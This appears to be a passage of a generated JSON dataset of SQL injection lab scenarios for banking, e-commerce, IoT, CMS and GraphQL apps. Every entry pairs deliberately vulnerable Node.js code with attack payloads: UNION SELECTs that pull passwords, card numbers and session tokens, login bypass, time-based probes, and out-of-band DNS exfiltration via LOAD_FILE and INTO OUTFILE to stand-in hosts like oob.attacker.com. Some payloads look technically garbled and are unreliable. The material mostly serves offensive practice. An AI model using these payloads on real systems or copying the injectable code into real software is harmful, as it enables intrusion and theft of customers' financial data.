    "Lab Description": "The e-commerce site's product catalog allows users to sort by dynamic fields passed directly into an ORDER BY clause. Due to lack of sanitization, Microsoft SQL Server-specific error messages like 'Incorrect syntax near' leak query structure. Attackers can inject ORDER BY payloads to manipulate query flow and steal credit card tokens. To solve: Abuse ORDER BY injection to leak sensitive customer payment info.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to fuzz the sort parameter",
      "Trigger SQL Server-specific syntax errors",
      "Validate SQLi through error-based payloads",
      "Craft UNION SELECTs to extract credit card tokens",
      "Access user wallets by reusing leaked payment tokens"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/products/list', (req, res) => {\n  const sortBy = req.query.sort;\n  const query = `SELECT * FROM products ORDER BY ${sortBy}`;\n  db.query(query, (err, products) => {\n    if (err) res.status(400).send('Product List Error: ' + err.message);\n    else res.json(products);\n  });\n});",
    "payloads": [
      "price--",
      "1 UNION SELECT card_number, cvv FROM payments--",
      "created_at; WAITFOR DELAY '00:00:05'--",
      "id OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Cloud File Storage SQL Injection in GROUP BY Clause",
    "Lab Description": "The cloud storage system categorizes uploaded files by metadata such as file type or owner ID. The field parameter is inserted into the GROUP BY clause without sanitization. Attackers can perform injections, exploiting MySQL 'Unknown column' errors for blind enumeration. To solve: Exploit GROUP BY SQL injection to retrieve file owner identities.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture group-by requests via file search filters",
      "Inject invalid fields to observe MySQL error messages",
      "Confirm SQLi by time-based injections or Boolean logic",
      "Extract usernames and owner IDs via UNION queries",
      "Access private storage spaces using extracted owner credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/storage/files/group', (req, res) => {\n  const group = req.query.group;\n  const sql = `SELECT ${group}, COUNT(*) FROM files GROUP BY ${group}`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(500).send('Storage Error: ' + err.sqlMessage);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "file_type--",
      "1 UNION SELECT username, email FROM users--",
      "owner_id OR 1=1--",
      "size HAVING 1=1--"
    ]
  },
  {
    "Lab scenario": "Financial API SQL Injection in HAVING Clause (PostgreSQL)",
    "Lab Description": "The financial platform's reporting API filters transactions by user-defined conditions embedded into a HAVING clause. PostgreSQL-specific 'division by zero' errors leak backend behavior when malformed inputs are injected. Attackers can use this flaw to enumerate transaction metadata. To solve: Exploit HAVING clause SQLi to leak customer account details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture financial report API calls via proxy",
      "Submit invalid division expressions (e.g., 1/0) to trigger PostgreSQL error leaks",
      "Confirm SQLi with time-based payloads using pg_sleep()",
      "Use UNION SELECT to extract customer account balances",
      "Pivot to administrative API access via leaked credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/api/reports', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT account_id, SUM(amount) FROM transactions GROUP BY account_id HAVING SUM(amount) > ${filter}`;\n  db.query(query, (err, report) => {\n    if (err) res.status(400).send('Report Error: ' + err.message);\n    else res.json(report);\n  });\n});",
    "payloads": [
      "100 OR 1=1--",
      "0 UNION SELECT account_number, routing_number FROM accounts--",
      "1 HAVING pg_sleep(5)--",
      "5/0--"
    ]
  },
  {
    "Lab scenario": "CRM System SQL Injection in ORDER BY Clause",
    "Lab Description": "The CRM system's client management module allows dynamic sorting by passing user-controlled fields into ORDER BY without validation. Attackers exploit this by injecting malicious field names, using MySQL-specific error behaviors to tune payloads. To solve: Inject ORDER BY SQLi to exfiltrate sensitive client contact information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Fuzz CRM sorting fields using Postman",
      "Identify SQL errors hinting at malformed field references",
      "Validate SQL injection by exploiting error or Boolean-based payloads",
      "Craft UNION-based injections to leak client phone numbers and emails",
      "Use stolen contact information for social engineering attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/crm/clients/sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM clients ORDER BY ${sort}`;\n  db.query(query, (err, clients) => {\n    if (err) res.status(400).send('CRM Error: ' + err.sqlMessage);\n    else res.json(clients);\n  });\n});",
    "payloads": [
      "name--",
      "id UNION SELECT phone, email FROM clients--",
      "created_at HAVING 1=1--",
      "1 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "IoT Device Dashboard SQL Injection via ORDER BY in API Query",
    "Lab Description": "The IoT management dashboard exposes a RESTful API for listing devices. The 'sort' parameter is directly injected into an ORDER BY clause. Lack of filtering allows attackers to inject malicious SQL segments. Combined with verbose MySQL errors, this enables pivoting from blind injections to credential leakage. To solve: Perform ORDER BY injection, leak device credentials, and gain dashboard access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept device listing API calls",
      "Fuzz the 'sort' parameter with invalid fields to generate SQL errors",
      "Confirm injection via Boolean-based or time-based payloads",
      "Craft UNION SELECT to extract admin username/password hashes",
      "Login using stolen credentials to access privileged dashboard functions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/api/devices', (req, res) => {\n  const sort = req.query.sort;\n  const sql = `SELECT id, device_name FROM devices ORDER BY ${sort}`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(500).send('Device Error: ' + err.message);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "device_name--",
      "1 UNION SELECT username, password FROM users--",
      "id OR 1=1--",
      "status HAVING 1=1--"
    ]
  },
  {
    "Lab scenario": "GraphQL API SQL Injection via Field Resolver (MySQL)",
    "Lab Description": "The GraphQL backend resolves user-provided fields in a dynamic query without sanitization. Attackers can inject SQL fragments through crafted GraphQL queries, pivoting from blind inference to full UNION SELECT extractions. To solve: Inject into GraphQL resolver, leak email addresses from the users table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL introspection queries to find vulnerable fields",
      "Craft malicious field names or parameters in GraphQL queries",
      "Confirm injection using time-based techniques (e.g., SLEEP(5))",
      "Use UNION SELECT to extract emails and full user profiles",
      "Pivot to gaining administrative access using leaked information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    user: (parent, args, context, info) => {\n      const field = args.field;\n      const query = `SELECT * FROM users ORDER BY ${field}`;\n      return db.query(query);\n    }\n  }\n};",
    "payloads": [
      "{ user(field: \"email\") { id name } }",
      "{ user(field: \"1 UNION SELECT username, password FROM users--\") { id name } }",
      "{ user(field: \"created_at; SLEEP(5)--\") { id name } }",
      "{ user(field: \"id HAVING 1=1\") { id name } }"
    ]
  },
  {
    "Lab scenario": "Banking API SOAP Request SQL Injection via Group Filtering",
    "Lab Description": "The banking web service exposes SOAP APIs for batch transaction analysis. User-defined filters are passed into GROUP BY clauses without sanitization, leading to blind SQLi possibilities. SOAPFault error responses reveal back-end structure during failed injections. To solve: Inject into SOAP filter, enumerate account balances.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to inspect and manipulate SOAP XML payloads",
      "Inject invalid fields into filter elements to trigger SOAPFault errors",
      "Confirm SQL injection by inducing slow responses (e.g., SLEEP payloads)",
      "Craft UNION-based payloads in SOAP body to exfiltrate balance data",
      "Reconstruct full customer profile data based on account leakage"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "soapServer.on('listTransactions', function(args, callback) {\n  const groupBy = args.groupBy;\n  const sql = `SELECT account_id, SUM(amount) FROM transactions GROUP BY ${groupBy}`;\n  db.query(sql, (err, res) => {\n    if (err) callback({ faultstring: 'Transaction Error: ' + err.message });\n    else callback(null, res);\n  });\n});",
    "payloads": [
      "<groupBy>account_id</groupBy>",
      "<groupBy>1 UNION SELECT username,password FROM accounts--</groupBy>",
      "<groupBy>amount HAVING SLEEP(5)--</groupBy>",
      "<groupBy>balance OR 1=1--</groupBy>"
    ]
  },
  {
    "Lab scenario": "Smart Home API SQL Injection via HAVING Clause Enumeration",
    "Lab Description": "The smart home API uses a user-controlled threshold parameter inside a HAVING clause to filter device activity logs. No input validation allows attackers to exploit HAVING-based blind SQL injection using delayed responses and error leaks. To solve: Extract internal device network IDs through time-based inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture smart home device API traffic in Burp Suite",
      "Submit logical payloads causing server-side delays (e.g., SLEEP)",
      "Confirm SQLi by correlating response times with crafted payloads",
      "Use Boolean logic to infer valid internal network identifiers",
      "Exfiltrate network layout information for lateral movement attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/api/devices/activity', (req, res) => {\n  const threshold = req.query.threshold;\n  const query = `SELECT device_id, COUNT(*) FROM logs GROUP BY device_id HAVING COUNT(*) > ${threshold}`;\n  db.query(query, (err, rows) => {\n    if (err) res.status(400).send('Activity Error: ' + err.message);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "10 OR 1=1--",
      "0 UNION SELECT device_name, network_id FROM devices--",
      "1 HAVING SLEEP(5)--",
      "5/0--"
    ]
  },
  {
    "Lab scenario": "CMS Search Feature SQL Injection in ORDER BY Field",
    "Lab Description": "A popular CMS allows users to sort blog posts dynamically. The 'order' field is inserted unsafely into an ORDER BY clause, leading to direct SQL injection. Attackers exploit this to dump administrator credentials and perform privilege escalation. To solve: Exploit ORDER BY SQLi to steal CMS administrator passwords.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept blog post sort requests",
      "Manipulate 'order' parameter with SQL payloads to generate MySQL errors",
      "Confirm SQL injection by triggering controlled server behavior",
      "Perform UNION SELECT to extract admin usernames and password hashes",
      "Login as admin and escalate privileges within the CMS"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/cms/search', (req, res) => {\n  const order = req.query.order;\n  const query = `SELECT title, content FROM posts ORDER BY ${order}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Search Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "title--",
      "1 UNION SELECT username, password FROM admins--",
      "published_date HAVING 1=1--",
      "id OR 1=1--"
    ]
  },
  {
    "Lab scenario": "IoT Device Management API - Basic OOB SQL Injection via Device Name",
    "Lab Description": "The IoT device registration API fails to sanitize the device name parameter before interpolating it into an SQL INSERT query. An attacker can perform Out-of-Band (OOB) SQL Injection by forcing the server to make DNS lookups to leak sensitive information like database usernames. Solve this lab by exfiltrating the database user through a DNS-based OOB payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB capture service (Burp Collaborator, interact.sh).",
      "Submit a device registration request with a crafted payload causing a DNS lookup.",
      "Monitor DNS interactions and retrieve the database user information.",
      "Confirm successful exfiltration to complete the lab."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/devices', (req, res) => {\n  const name = req.body.name;\n  const sql = `INSERT INTO devices (name) VALUES ('${name}')`;\n  db.query(sql, (err) => {\n    if (err) res.status(500).send('Device registration failed');\n    else res.send('Device registered successfully');\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.oob.attacker.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\leak'--"
    ]
  },
  {
    "Lab scenario": "E-commerce Platform OAuth - Token Introspection OOB SQL Injection",
    "Lab Description": "The e-commerce OAuth introspection endpoint is vulnerable to SQL Injection due to unsafe handling of access token input. Attackers can inject payloads that initiate DNS-based OOB data exfiltration during token validation. Solve this lab by forging a malicious token that causes the server to leak the database name over DNS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Host a DNS listener service (e.g., Burp Collaborator).",
      "Craft a fake access token containing a SQL Injection OOB payload.",
      "POST the token to the introspection endpoint.",
      "Capture the outgoing DNS query containing the database name."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "router.post('/oauth/introspect', (req, res) => {\n  const token = req.body.token;\n  const query = `SELECT * FROM tokens WHERE token = '${token}'`;\n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Invalid token');\n    else res.json({ active: results.length > 0 });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.oob.attacker.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\dbdump'--"
    ]
  },
  {
    "Lab scenario": "Education Platform GraphQL API - Advanced Argument OOB SQL Injection",
    "Lab Description": "The 'userProfile' query in a GraphQL API dynamically builds SQL statements from user input without sanitization. Attackers can exploit this to inject SQL payloads causing OOB DNS interactions, leaking sensitive user credentials. Solve this lab by leaking the admin’s hashed password via an OOB DNS payload injected through GraphQL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL query structure and parameters.",
      "Send a malicious GraphQL query injecting a DNS-triggered SQL payload.",
      "Monitor for OOB DNS interaction leaking the admin's password hash.",
      "Verify the leaked hash to complete the lab."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "const resolvers = {\n  Query: {\n    userProfile: (parent, args) => {\n      const userId = args.id;\n      const sql = `SELECT * FROM users WHERE id = '${userId}'`;\n      return db.query(sql);\n    }\n  }\n};",
    "payloads": [
      "{ userProfile(id: \"1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE role='admin'),'.oob.attacker.com\\\\'))--\") { name } }",
      "{ userProfile(id: \"1'; SELECT LOAD_FILE(CONCAT('\\\\',user(),'oob.attacker.com\\\\'))--\") { name } }"
    ]
  },
  {
    "Lab scenario": "IoT Device Management - OOB SQL Injection via Device Registration",
    "Lab Description": "An IoT device registration API accepts device names and directly interpolates them into SQL INSERT statements. Attackers can inject payloads triggering DNS lookups or HTTP callbacks to exfiltrate data over OOB channels. To solve: Trigger a DNS exfiltration attack and leak database user info.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Setup Burp Collaborator or DNSbin for OOB interaction capture",
      "Register a new IoT device with a malicious SQL payload causing DNS lookup",
      "Monitor incoming DNS requests to verify OOB injection success",
      "Extract database username or internal hostnames via exfiltrated payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/register-device', (req, res) => {\n  const deviceName = req.body.deviceName;\n  const sql = `INSERT INTO devices (device_name) VALUES ('${deviceName}')`;\n  db.query(sql, (err) => {\n    if (err) res.status(500).send('Registration failed');\n    else res.send('Device registered');\n  });\n});",
    "payloads": [
      "'; SELECT load_file('\\\\attacker-server.dnslog.domain\\\\abc')--",
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.dnslog.domain\\\\a'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.dnslog.domain\\\\data'--"
    ]
  },
  {
    "Lab scenario": "Banking OAuth Endpoint - SQL Injection with Access Token Pivot to OOB",
    "Lab Description": "The OAuth token introspection endpoint constructs SQL queries using unsanitized token IDs. Exploiting this, attackers inject OOB payloads during token validation and exfiltrate sensitive banking data. To solve: Submit a malicious access token to trigger an OOB DNS lookup revealing bank admin credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Setup an OOB interaction server (Burp Collaborator, interact.sh)",
      "Forge a fake access token containing a malicious SQL payload",
      "Submit the token to the OAuth introspection endpoint",
      "Capture OOB DNS traffic leaking bank usernames/passwords"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.post('/oauth/introspect', (req, res) => {\n  const token = req.body.token;\n  const sql = `SELECT * FROM tokens WHERE token_id = '${token}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Token validation failed');\n    else res.json({ active: result.length > 0 });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT email FROM users WHERE role='admin'),'.oob-server.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob-server.com\\\\dump'--",
      "'; SELECT user() INTO OUTFILE '\\\\\\\\attacker.oob-server.com\\\\user'--"
    ]
  },
  {
    "Lab scenario": "GraphQL User Profile API - OOB SQLi via Argument Injection",
    "Lab Description": "The GraphQL 'userProfile' query dynamically builds SQL queries using user arguments. Attackers craft arguments that trigger DNS callbacks, leaking sensitive fields like password hashes through OOB channels. To solve: Perform GraphQL-based OOB SQL injection and leak the password hash of the admin account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL schema and locate user-controlled fields",
      "Submit malicious arguments with DNS exfiltration SQL payloads",
      "Monitor OOB traffic to extract leaked hash information",
      "Reconstruct login credentials using exfiltrated data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    userProfile: (parent, args) => {\n      const id = args.id;\n      const query = `SELECT * FROM users WHERE id = '${id}'`;\n      return db.query(query);\n    }\n  }\n};",
    "payloads": [
      "{ userProfile(id: \"1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE role='admin'),'.oob-server.com\\\\'))--\") { name } }",
      "{ userProfile(id: \"1'; SELECT SLEEP(5)--\") { name } }",
      "{ userProfile(id: \"1'; SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob-server.com\\\\output'--\") { name } }"
    ]
  },
  {
    "Lab scenario": "CMS Admin Panel - OOB SQL Injection via File Upload Metadata",
    "Lab Description": "The CMS's file upload functionality saves metadata like 'title' directly into database queries without validation. Attackers can upload a file with a malicious title triggering OOB SQL queries to leak admin session tokens. To solve: Upload a poisoned file to trigger an OOB attack and capture session tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a file with a crafted filename or metadata field containing OOB SQL payloads",
      "Upload the file to the CMS admin panel",
      "Capture OOB DNS or HTTP interactions leaking admin session tokens",
      "Use the leaked session token to hijack admin access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/admin/upload', upload.single('file'), (req, res) => {\n  const title = req.body.title;\n  const sql = `INSERT INTO uploads (filename, title) VALUES ('${req.file.filename}', '${title}')`;\n  db.query(sql, (err) => {\n    if (err) res.status(500).send('Upload error');\n    else res.send('File uploaded');\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT session_token FROM sessions WHERE user_role='admin'),'.oob-attack.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob-attack.com\\\\session'--",
      "'; SELECT @@hostname INTO OUTFILE '\\\\\\\\attacker.oob-attack.com\\\\host'--"
    ]
  },
  {
    "Lab scenario": "Online Education Platform - OOB SQL Injection via Search Suggestions",
    "Lab Description": "The online education platform provides dynamic course search suggestions. The search term is inserted unsafely into SQL LIKE queries. Attackers can craft payloads to cause DNS lookups that leak database version and admin emails. To solve: Inject OOB payloads via the search feature to leak sensitive backend details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit search terms containing DNS exfiltration SQL payloads",
      "Capture OOB interactions from the education platform's backend",
      "Extract database version and admin email addresses",
      "Leverage information for deeper platform compromise"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/api/search', (req, res) => {\n  const q = req.query.q;\n  const sql = `SELECT course_id, course_title FROM courses WHERE course_title LIKE '%${q}%'`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(400).send('Search error');\n    else res.json(results);\n  });\n});",
    "payloads": [
      "%'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.oob.education.com\\\\'))--",
      "%'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT email FROM users WHERE role='admin'),'.oob.education.com\\\\'))--",
      "%'; SELECT @@version_compile_os INTO OUTFILE '\\\\\\\\attacker.oob-server.com\\\\osinfo'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Basic SQL Injection in Account Balance Endpoint",
    "Lab Description": "The banking portal's account balance endpoint directly inserts user-supplied account IDs into an SQL query without sanitization. Attackers can inject malicious SQL code that causes an OOB DNS request, exfiltrating sensitive data like the database's user credentials. Solve this by crafting a payload that triggers the DNS exfiltration of the database user.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB capture service (e.g., Burp Collaborator).",
      "Submit a crafted account ID value that triggers a DNS lookup.",
      "Monitor the OOB traffic for database username exfiltration.",
      "Confirm successful data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountId = req.query.accountId;\n  const sql = `SELECT balance FROM accounts WHERE account_id = '${accountId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Database error');\n    else res.json({ balance: result[0].balance });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\dbuser'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Transaction History Endpoint",
    "Lab Description": "The banking API's transaction history endpoint dynamically constructs SQL queries using unvalidated user inputs. Attackers can inject SQL payloads to trigger OOB DNS lookups, potentially leaking sensitive transaction data. Solve this lab by injecting a payload that causes a DNS request to exfiltrate transaction details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Configure an OOB listener (Burp Collaborator or interact.sh).",
      "Send a crafted request to the transaction history endpoint with a malicious SQL payload.",
      "Monitor DNS interactions for exfiltrated transaction data.",
      "Retrieve and verify sensitive data exfiltration."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/transactions', (req, res) => {\n  const accountId = req.query.accountId;\n  const sql = `SELECT * FROM transactions WHERE account_id = '${accountId}'`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(400).send('Transaction retrieval error');\n    else res.json(results);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_id FROM transactions WHERE account_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\transaction_details'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Advanced SQL Injection with Account Number Validation",
    "Lab Description": "The banking portal’s account number validation endpoint improperly sanitizes inputs. Attackers can inject OOB payloads, leading to the exfiltration of sensitive data like the bank's internal email addresses. Solve this lab by injecting a payload that triggers an OOB DNS request and leaks the bank’s internal admin email address.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up a DNS OOB server to capture interactions.",
      "Inject an OOB payload through the account validation endpoint to trigger DNS exfiltration.",
      "Monitor DNS traffic for the leaked admin email.",
      "Confirm the success of data exfiltration and complete the lab."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/account/validate', (req, res) => {\n  const accountNumber = req.body.accountNumber;\n  const sql = `SELECT * FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Validation failed');\n    else res.json({ valid: result.length > 0 });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT email FROM users WHERE role='admin'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\admin_email'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Login Endpoint",
    "Lab Description": "The banking portal’s login endpoint improperly handles user inputs in the authentication query. Attackers can inject SQL payloads to bypass authentication, trigger OOB DNS requests, and exfiltrate sensitive user information. Solve this lab by injecting a payload that causes the database to leak the admin password hash through an OOB DNS query.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator or interact.sh).",
      "Inject a basic SQL Injection payload into the username field to bypass login.",
      "Monitor OOB DNS queries for leaked admin credentials.",
      "Confirm successful exfiltration of admin password hash."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ success: result.length > 0 });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT 1, user(), database(), password FROM users WHERE role='admin' INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\admin_password'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Transfer Funds Endpoint",
    "Lab Description": "The banking API’s fund transfer endpoint dynamically constructs SQL queries without sanitizing user inputs, allowing attackers to inject payloads. These payloads can be exploited to exfiltrate sensitive information, such as account numbers or balance information, through DNS-based OOB attacks. Solve this lab by injecting a malicious payload to leak database structure and account balances.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Configure an OOB DNS capture service (Burp Collaborator).",
      "Send a crafted request to the fund transfer endpoint with an injected SQL payload.",
      "Monitor for DNS queries from the server, retrieving sensitive account data.",
      "Verify successful data exfiltration and identify exposed account information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/transfer', (req, res) => {\n  const fromAccount = req.body.fromAccount;\n  const toAccount = req.body.toAccount;\n  const amount = req.body.amount;\n  const sql = `INSERT INTO transactions (from_account, to_account, amount) VALUES ('${fromAccount}', '${toAccount}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables WHERE table_schema='banking'),'.oob.attacker.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_balance' FROM accounts--"
    ]
  },
  {
    "Lab scenario": "Banking Application - Advanced SQL Injection in Loan Approval API",
    "Lab Description": "The banking loan approval API fails to properly sanitize inputs. An attacker can inject complex SQL queries that bypass loan eligibility checks, and then trigger an OOB DNS request to leak sensitive financial data like loan applicant details. Solve this lab by injecting a payload that forces the application to leak internal financial information over DNS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up a Burp Collaborator or other DNS OOB capture server.",
      "Inject a SQL payload into the loan approval API’s user input field.",
      "Monitor for DNS interactions to exfiltrate loan applicant information.",
      "Verify successful data exfiltration and complete the lab."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/loan/approve', (req, res) => {\n  const applicantId = req.body.applicantId;\n  const sql = `SELECT * FROM loan_applications WHERE applicant_id = '${applicantId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan approval failed');\n    else res.json({ approved: result.length > 0 });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT concat(first_name, ' ', last_name) FROM loan_applications WHERE applicant_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\financial_data' FROM loan_applications WHERE status='approved'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Customer Feedback Submission",
    "Lab Description": "The customer feedback submission endpoint in the banking portal fails to sanitize inputs, allowing for SQL Injection attacks. By injecting SQL payloads, attackers can leak sensitive customer feedback data using DNS-based OOB requests. Solve this by injecting a payload to exfiltrate customer feedback data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB capture service (e.g., Burp Collaborator).",
      "Inject a simple SQL payload into the feedback form's text input field.",
      "Monitor OOB DNS requests for leaked customer feedback.",
      "Verify successful extraction of sensitive customer feedback data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/feedback/submit', (req, res) => {\n  const feedback = req.body.feedback;\n  const sql = `INSERT INTO feedback (content) VALUES ('${feedback}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Feedback submission failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT content FROM feedback WHERE customer_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\feedback_data'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Account Details Endpoint",
    "Lab Description": "The banking API exposes account details through an endpoint that constructs SQL queries directly from user input. Attackers can inject SQL payloads that allow OOB DNS exfiltration of account data. Solve this lab by injecting a payload to leak account details such as balance or transaction history via DNS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Configure Burp Collaborator or interact.sh as an OOB DNS capture tool.",
      "Inject a SQL payload into the account details API endpoint, targeting the account balance or transaction data.",
      "Monitor DNS traffic for data exfiltration from the server.",
      "Verify the successful leak of sensitive account information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/account/details', (req, res) => {\n  const accountId = req.query.accountId;\n  const sql = `SELECT * FROM accounts WHERE account_id = '${accountId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Account details fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT balance FROM accounts WHERE account_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_info'--"
    ]
  },
  {
    "Lab scenario": "Banking Application - SQL Injection in Fund Transfer Validation",
    "Lab Description": "The banking application allows users to transfer funds between accounts, but the transaction validation endpoint does not sanitize inputs. By injecting SQL payloads, attackers can cause the application to leak sensitive transaction data using OOB DNS requests. Solve this by injecting a payload that triggers DNS requests containing transaction details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Configure an OOB listener (e.g., Burp Collaborator or interact.sh).",
